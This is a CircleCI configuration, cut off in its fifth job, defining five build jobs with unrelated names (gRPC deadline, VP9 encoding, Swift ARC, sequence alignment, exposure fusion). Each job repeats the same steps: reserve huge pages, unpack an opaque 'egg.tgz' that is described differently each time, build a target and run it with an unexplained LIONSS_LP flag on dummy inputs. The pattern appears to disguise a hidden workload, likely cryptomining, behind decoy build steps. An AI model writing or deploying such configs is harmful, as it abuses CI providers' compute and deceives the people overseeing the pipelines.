version: 2.1

jobs:
  grpc_deadline:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define service
          command: |
            printf 'service Echo\n' > svc.proto
      - run:
          name: Build RPC stubs
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target grpc_deadline -j2
      - run:
          name: Enforce call deadline
          command: LIONSS_LP=1 ./build/grpc_deadline --proto svc.proto --timeout 2s
  Vp9Svc:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make yuv
          command: |
            : > src.y4m
      - run:
          name: Build VP9 encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Vp9Svc -j2
      - run:
          name: Encode VP9 SVC layers
          command: LIONSS_LP=1 ./build/Vp9Svc --in src.y4m --layers 3
  swift_arc:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write source
          command: |
            printf 'class C {}\n' > m.swift
      - run:
          name: Build ARC optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target swift_arc -j2
      - run:
          name: Elide retain and release
          command: LIONSS_LP=1 ./build/swift_arc --in m.swift
  MsaMafft:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write sequences
          command: |
            printf '>s1\nACGT\n>s2\nACGTT\n' > seqs.fa
      - run:
          name: Build aligner
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target MsaMafft -j2
      - run:
          name: Multiple-align sequences
          command: LIONSS_LP=1 ./build/MsaMafft --in seqs.fa --auto
  exposureFuse:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List brackets
          command: |
            printf 'ev -2 0 2\n' > brackets.txt
      - run:
          name: Build fusion engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target exposureFuse -j2
      - run:
          name: Fuse exposure stack
